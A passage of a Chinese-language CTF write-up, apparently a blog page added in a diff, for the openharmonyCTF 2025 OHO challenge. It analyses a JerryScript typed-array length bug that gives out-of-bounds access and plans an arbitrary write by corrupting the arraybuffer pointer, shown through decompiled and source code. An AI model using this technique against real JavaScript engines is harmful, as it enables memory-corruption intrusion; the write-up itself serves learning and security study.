@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>openharmonyCTF 2025 OHO</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./openharmonyCTF 2025 OHO.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">openharmonyCTF 2025 OHO</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-06-09]</div>
+    </header>
+    <div class="layout-grid">
+                <main><p>riscv架构 启动脚本要加<code>-bios none</code>
+给了一个elf，启动后通过内嵌的jerryscript执行js代码，需要利用其中存在的漏洞改写全局变量debug值不为空获得flag</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">void</span><span style="color:#c0c5ce;"> __noreturn </span><span style="color:#8fa1b3;">OsIdleTask</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">OsRecycleFinishedTask</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( PmEnter )
+</span><span style="color:#c0c5ce;">      </span><span style="color:#8fa1b3;">PmEnter</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else
+</span><span style="color:#c0c5ce;">      </span><span style="color:#8fa1b3;">ArchEnterSleep</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( debug )
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">      </span><span style="color:#8fa1b3;">_wrap_printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Debug mode is enabled, check challenge setting: </span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, &amp;aSDMemoryCheckE_1[-</span><span style="color:#d08770;">1148</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#c0c5ce;">      </span><span style="color:#96b5b4;">fflush</span><span style="color:#c0c5ce;">(*(impure_ptr + </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>找到对应版本，获得源码 https://gitee.com/openharmony/third_party_jerryscript</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">text</span><span style="color:#c0c5ce;">:802FD2C8 aOpenharmony40B:.</span><span style="color:#bf616a;">string </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">OpenHarmony 4.0 Beta1</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0
+</span></pre>
+<p>发现历史漏洞<code>CVE-2020-22597</code>漏洞代码没有修复</p>
+<p>使用jerry官方针对漏洞给出的测试代码测试时，发现不对劲，之后误打误撞发现了创建的typedarray数组长度有问题</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">// Copyright JS Foundation and other contributors, http://js.foundation
+</span><span style="color:#65737e;">//
+</span><span style="color:#65737e;">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
+</span><span style="color:#65737e;">// you may not use this file except in compliance with the License.
+</span><span style="color:#65737e;">// You may obtain a copy of the License at
+</span><span style="color:#65737e;">//
+</span><span style="color:#65737e;">//     http://www.apache.org/licenses/LICENSE-2.0
+</span><span style="color:#65737e;">//
+</span><span style="color:#65737e;">// Unless required by applicable law or agreed to in writing, software
+</span><span style="color:#65737e;">// distributed under the License is distributed on an &quot;AS IS&quot; BASIS
+</span><span style="color:#65737e;">// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+</span><span style="color:#65737e;">// See the License for the specific language governing permissions and
+</span><span style="color:#65737e;">// limitations under the License.
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// Make sure that TypedArray filter correctly copies the data (avoid overflow).
+</span><span style="color:#65737e;">// Test creates a smaller region for &quot;output&quot; TypedArray.
+</span><span style="color:#65737e;">// Last number is intentionally a &quot;big&quot; float.
+</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">big_array </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">Float64Array</span><span style="color:#c0c5ce;">([</span><span style="color:#d08770;">0.523565555</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">333333232134.1</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#bf616a;">big_array</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">constructor </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">Float32Array</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">result_float32_array </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">big_array</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">filter</span><span style="color:#c0c5ce;">(x </span><span style="color:#b48ead;">=&gt; </span><span style="color:#bf616a;">x </span><span style="color:#c0c5ce;">% </span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#8fa1b3;">assert</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">result_float32_array </span><span style="color:#c0c5ce;">instanceof </span><span style="color:#bf616a;">Float32Array</span><span style="color:#c0c5ce;">);
+</span><span style="color:#8fa1b3;">assert</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">result_float32_array</span><span style="color:#c0c5ce;">.length === </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// Create an even smaller result TypedArray.
+</span><span style="color:#bf616a;">big_array</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">constructor </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">Uint8Array</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">result_uint8_array </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">big_array</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">filter</span><span style="color:#c0c5ce;">(x </span><span style="color:#b48ead;">=&gt; </span><span style="color:#bf616a;">x </span><span style="color:#c0c5ce;">% </span><span style="color:#d08770;">3 </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#8fa1b3;">assert</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">result_uint8_array </span><span style="color:#c0c5ce;">instanceof </span><span style="color:#bf616a;">Uint8Array</span><span style="color:#c0c5ce;">);
+</span><span style="color:#8fa1b3;">assert</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">result_uint8_array</span><span style="color:#c0c5ce;">.length === </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// Trigger a filter error when at the last element
+</span><span style="color:#b48ead;">try </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#bf616a;">big_array</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">filter</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">function</span><span style="color:#c0c5ce;">(x, idx) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">&gt; </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">throw </span><span style="color:#c0c5ce;">new </span><span style="color:#ebcb8b;">Error</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Error test magic</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">x </span><span style="color:#c0c5ce;">% </span><span style="color:#d08770;">4 </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  });
+</span><span style="color:#c0c5ce;">} </span><span style="color:#b48ead;">catch </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ex</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">assert</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ex </span><span style="color:#c0c5ce;">instanceof </span><span style="color:#ebcb8b;">Error</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">assert</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ex</span><span style="color:#c0c5ce;">.message === &quot;</span><span style="color:#a3be8c;">Error test magic</span><span style="color:#c0c5ce;">&quot;);
+</span></pre>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">OHOS # eval
+</span><span style="color:#c0c5ce;">Max length: 1024
+</span><span style="color:#c0c5ce;">End with &#39;EOF&#39;
+</span><span style="color:#c0c5ce;">Content: let array = new Uint32Array(0x1000);
+</span><span style="color:#c0c5ce;">print(array.length.toString(16));
+</span><span style="color:#c0c5ce;">EOF
+</span><span style="color:#c0c5ce;">4000
+</span></pre>
+<p>找到源码中获取typedarray长度函数<code>ecma_typedarray_get_length</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">/**
+</span><span style="color:#65737e;"> * Get the array length of the typedarray object
+</span><span style="color:#65737e;"> *
+</span><span style="color:#65737e;"> * @return the array length
+</span><span style="color:#65737e;"> */
+</span><span style="color:#c0c5ce;">ecma_length_t
+</span><span style="color:#8fa1b3;">ecma_typedarray_get_length </span><span style="color:#c0c5ce;">(ecma_object_t *</span><span style="color:#bf616a;">typedarray_p</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">/**&lt; the pointer to the typedarray object */
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">JERRY_ASSERT </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ecma_object_is_typedarray </span><span style="color:#c0c5ce;">(typedarray_p));
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  ecma_extended_object_t *ext_object_p = (ecma_extended_object_t *) typedarray_p;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ext_object_p-&gt;u.</span><span style="color:#bf616a;">pseudo_array</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">== ECMA_PSEUDO_ARRAY_TYPEDARRAY)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    ecma_object_t *arraybuffer_p = </span><span style="color:#8fa1b3;">ecma_get_object_from_value </span><span style="color:#c0c5ce;">(ext_object_p-&gt;u.</span><span style="color:#bf616a;">pseudo_array</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">u2</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">arraybuffer</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    ecma_length_t buffer_length = </span><span style="color:#8fa1b3;">ecma_arraybuffer_get_length </span><span style="color:#c0c5ce;">(arraybuffer_p);
+</span><span style="color:#c0c5ce;">    uint8_t shift = </span><span style="color:#8fa1b3;">ecma_typedarray_get_element_size_shift </span><span style="color:#c0c5ce;">(typedarray_p);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> buffer_length &gt;&gt; shift;
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  ecma_object_t *arraybuffer_p = </span><span style="color:#8fa1b3;">ecma_typedarray_get_arraybuffer </span><span style="color:#c0c5ce;">(typedarray_p);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ecma_arraybuffer_is_detached </span><span style="color:#c0c5ce;">(arraybuffer_p))
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  ecma_extended_typedarray_object_t *info_p = (ecma_extended_typedarray_object_t *) ext_object_p;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> info_p-&gt;array_length;
+</span><span style="color:#c0c5ce;">} </span><span style="color:#65737e;">/* ecma_typedarray_get_length */
+</span></pre>
+<p>对比题目中该函数实现</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">ecma_length_t __cdecl </span><span style="color:#8fa1b3;">ecma_typedarray_get_length</span><span style="color:#c0c5ce;">(ecma_object_t *</span><span style="color:#bf616a;">typedarray_p</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  ecma_object_t *arraybuffer_p; </span><span style="color:#65737e;">// [sp+20h] [-30h]
+</span><span style="color:#c0c5ce;">  ecma_length_t buffer_length; </span><span style="color:#65737e;">// [sp+24h] [-2Ch]
+</span><span style="color:#c0c5ce;">  ecma_object_t *arraybuffer_p_0; </span><span style="color:#65737e;">// [sp+2Ch] [-24h]
+</span><span style="color:#c0c5ce;">  ecma_length_t buffer_length_0; </span><span style="color:#65737e;">// [sp+30h] [-20h]
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( </span><span style="color:#8fa1b3;">LOBYTE</span><span style="color:#c0c5ce;">(typedarray_p[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">type_flags_refs</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    arraybuffer_p_0 = </span><span style="color:#8fa1b3;">ecma_get_object_from_value</span><span style="color:#c0c5ce;">(*&amp;typedarray_p[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">u1</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">property_list_cp</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    buffer_length_0 = </span><span style="color:#8fa1b3;">ecma_arraybuffer_get_length</span><span style="color:#c0c5ce;">(arraybuffer_p_0);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ecma_typedarray_get_element_size_shift</span><span style="color:#c0c5ce;">(typedarray_p);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> buffer_length_0;
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">else
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    arraybuffer_p = </span><span style="color:#8fa1b3;">ecma_get_object_from_value</span><span style="color:#c0c5ce;">(*&amp;typedarray_p[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">u1</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">property_list_cp</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    buffer_length = </span><span style="color:#8fa1b3;">ecma_arraybuffer_get_length</span><span style="color:#c0c5ce;">(arraybuffer_p);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( </span><span style="color:#8fa1b3;">ecma_arraybuffer_is_detached</span><span style="color:#c0c5ce;">(arraybuffer_p) )
+</span><span style="color:#c0c5ce;">      </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else
+</span><span style="color:#c0c5ce;">      </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> buffer_length;
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>发现漏洞点，获取typedarray长度时，原本会根据数据类型右移，获得数组长度。题目中删掉了右移操作，造成存在数组越界</p>
+<p>另外还发现题目删去了DataView类型，以前碰到jerry都是arraybuffer+dataview组合拳</p>
+<p>聚焦typedarray结构，在<code>ecma-global.h</code>文件中定义了结构体，各种类型的结构以union的形式定义在同一个结构中，typedarray（如Uint32Array）定义部分如下，union部分对应pseudo_array</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">/**
+</span><span style="color:#65737e;"> * Description of extended ECMA-object.
+</span><span style="color:#65737e;"> *
+</span><span style="color:#65737e;"> * The extended object is an object with extra fields.
+</span><span style="color:#65737e;"> */
+</span><span style="color:#b48ead;">typedef struct
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  ecma_object_t object; </span><span style="color:#65737e;">/**&lt; object header */
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">/**
+</span><span style="color:#65737e;">   * Description of extra fields. These extra fields depend on the object type.
+</span><span style="color:#65737e;">   */
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">union
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    ecma_built_in_props_t built_in; </span><span style="color:#65737e;">/**&lt; built-in object part */
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/**
+</span><span style="color:#65737e;">     * Description of pseudo array objects.
+</span><span style="color:#65737e;">     */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">      uint8_t type; </span><span style="color:#65737e;">/**&lt; pseudo array type, e.g. Arguments, TypedArray, ArrayIterator */
+</span><span style="color:#c0c5ce;">      uint8_t extra_info; </span><span style="color:#65737e;">/**&lt; extra information about the object.
+</span><span style="color:#65737e;">                           *   e.g. the specific builtin id for typed arrays,
+</span><span style="color:#65737e;">                           *        [[IterationKind]] property for %Iterator% */
+</span><span style="color:#c0c5ce;">      </span><span style="color:#b48ead;">union
+</span><span style="color:#c0c5ce;">      {
+</span><span style="color:#c0c5ce;">        ecma_value_t lex_env_cp; </span><span style="color:#65737e;">/**&lt; for arguments: lexical environment */
+</span><span style="color:#c0c5ce;">        ecma_value_t arraybuffer; </span><span style="color:#65737e;">/**&lt; for typedarray: internal arraybuffer */
+</span><span style="color:#c0c5ce;">        ecma_value_t iterated_value; </span><span style="color:#65737e;">/**&lt; for %Iterator%: [[IteratedObject]] property */
+</span><span style="color:#c0c5ce;">        ecma_value_t spread_value; </span><span style="color:#65737e;">/**&lt; for spread object: spreaded element */
+</span><span style="color:#c0c5ce;">      } u2;
+</span><span style="color:#c0c5ce;">    } pseudo_array;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    ecma_external_handler_t external_handler_cb; </span><span style="color:#65737e;">/**&lt; external function */
+</span><span style="color:#c0c5ce;">  } u;
+</span><span style="color:#c0c5ce;">} ecma_extended_object_t;
+</span></pre>
+<p><code>arraybuffer</code>指针即实际指向数据的指针，考虑通过越界修改该指针实现任意地址写</p>
+<p>分析对一个uint32array数组内容进行赋值时的逻辑，走到
+<code>ecma_set_typedarray_element (info.buffer_p + byte_pos, num_var, info.id);</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">uint32_t array_index = </span><span style="color:#8fa1b3;">ecma_string_get_array_index </span><span style="color:#c0c5ce;">(property_name_p);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(array_index != ECMA_STRING_NOT_ARRAY_INDEX)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  ecma_number_t num_var;
+</span><span style="color:#c0c5ce;">  ecma_value_t error = </span><span style="color:#8fa1b3;">ecma_get_number </span><span style="color:#c0c5ce;">(value, &amp;num_var);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ECMA_IS_VALUE_ERROR </span><span style="color:#c0c5ce;">(error))
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">jcontext_release_exception </span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">ecma_reject </span><span style="color:#c0c5ce;">(is_throw);
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  ecma_typedarray_info_t info = </span><span style="color:#8fa1b3;">ecma_typedarray_get_info </span><span style="color:#c0c5ce;">(object_p);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(array_index &gt;= info.</span><span style="color:#bf616a;">length</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">ecma_reject </span><span style="color:#c0c5ce;">(is_throw);
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  ecma_length_t byte_pos = array_index &lt;&lt; info.</span><span style="color:#bf616a;">shift</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">ecma_set_typedarray_element </span><span style="color:#c0c5ce;">(info.</span><span style="color:#bf616a;">buffer_p </span><span style="color:#c0c5ce;">+ byte_pos, num_var, info.</span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">/* here */
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ECMA_VALUE_TRUE;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>函数根据具体数据类型进不同的赋值函数</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">/**
+</span><span style="color:#65737e;"> * set typedarray&#39;s element value
+</span><span style="color:#65737e;"> */
+</span><span style="color:#b48ead;">inline void</span><span style="color:#c0c5ce;"> JERRY_ATTR_ALWAYS_INLINE
+</span><span style="color:#8fa1b3;">ecma_set_typedarray_element </span><span style="color:#c0c5ce;">(lit_utf8_byte_t *</span><span style="color:#bf616a;">dst_p</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">                             ecma_number_t </span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">                             ecma_typedarray_type_t </span><span style="color:#bf616a;">typedarray_id</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  ecma_typedarray_setters[typedarray_id](dst_p, value);
+</span><span style="color:#c0c5ce;">} </span><span style="color:#65737e;">/* ecma_set_typedarray_element */
+</span></pre>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">/**
+</span><span style="color:#65737e;"> * List of typedarray setters based on their builtin id
+</span><span style="color:#65737e;"> */
+</span><span style="color:#b48ead;">static const</span><span style="color:#c0c5ce;"> ecma_typedarray_setter_fn_t ecma_typedarray_setters[] =
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  ecma_typedarray_set_int8_element,          </span><span style="color:#65737e;">/**&lt; Int8Array */
+</span><span style="color:#c0c5ce;">  ecma_typedarray_set_uint8_element,         </span><span style="color:#65737e;">/**&lt; Uint8Array */
+</span><span style="color:#c0c5ce;">  ecma_typedarray_set_uint8_clamped_element, </span><span style="color:#65737e;">/**&lt; Uint8ClampedArray */
+</span><span style="color:#c0c5ce;">  ecma_typedarray_set_int16_element,         </span><span style="color:#65737e;">/**&lt; Int16Array */
+</span><span style="color:#c0c5ce;">  ecma_typedarray_set_uint16_element,        </span><span style="color:#65737e;">/**&lt; Int32Array */
+</span><span style="color:#c0c5ce;">  ecma_typedarray_set_int32_element,         </span><span style="color:#65737e;">/**&lt; Uint32Array */
+</span><span style="color:#c0c5ce;">  ecma_typedarray_set_uint32_element,        </span><span style="color:#65737e;">/**&lt; Uint32Array */
+</span><span style="color:#c0c5ce;">  ecma_typedarray_set_float_element,         </span><span style="color:#65737e;">/**&lt; Float32Array */
+</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ENABLED (JERRY_NUMBER_TYPE_FLOAT64)
+</span><span style="color:#c0c5ce;">  ecma_typedarray_set_double_element,        </span><span style="color:#65737e;">/**&lt; Float64Array */
+</span><span style="color:#b48ead;">#endif </span><span style="color:#65737e;">/* ENABLED (JERRY_NUMBER_TYPE_FLOAT64) */
+</span><span style="color:#c0c5ce;">};
+</span></pre>
+<p>最终就是执行memcpy完成赋值</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">/**
+</span><span style="color:#65737e;"> * Write an uint32_t value into the given arraybuffer
+</span><span style="color:#65737e;"> */
+</span><span style="color:#b48ead;">static void
+</span><span style="color:#8fa1b3;">ecma_typedarray_set_uint32_element </span><span style="color:#c0c5ce;">(lit_utf8_byte_t *</span><span style="color:#bf616a;">dst_p</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/**&lt; the location in the internal arraybuffer */
+</span><span style="color:#c0c5ce;">                                    ecma_number_t </span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">/**&lt; the number value to set */
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  uint32_t num = (uint32_t) </span><span style="color:#8fa1b3;">ecma_typedarray_setter_number_to_uint32 </span><span style="color:#c0c5ce;">(value);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">memcpy </span><span style="color:#c0c5ce;">(dst_p, &amp;num, sizeof (uint32_t));
+</span><span style="color:#c0c5ce;">} </span><span style="color:#65737e;">/* ecma_typedarray_set_uint32_element */
+</span></pre>
+<p>观察反汇编代码，发现在下面位置获取到了uint32array的各结构信息：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#8fa1b3;">ecma_typedarray_get_info</span><span style="color:#c0c5ce;">(&amp;property_ref, object_pa);
+</span></pre>
+<p>对应源码如下，<code>ecma_typedarray_get_arraybuffer</code>获取指针 但是直接看源码不是很好定位偏移，并且<code>ecma_get_object_from_value()</code>函数最终将结构体存储的指针进行解压缩等处理 还原为真实指针</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">/**
+</span><span style="color:#65737e;"> * Method for getting the additional typedArray informations.
+</span><span style="color:#65737e;"> */
+</span><span style="color:#c0c5ce;">ecma_typedarray_info_t
+</span><span style="color:#8fa1b3;">ecma_typedarray_get_info </span><span style="color:#c0c5ce;">(ecma_object_t *</span><span style="color:#bf616a;">typedarray_p</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  ecma_typedarray_info_t info;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  info.</span><span style="color:#bf616a;">id </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">ecma_get_typedarray_id </span><span style="color:#c0c5ce;">(typedarray_p);
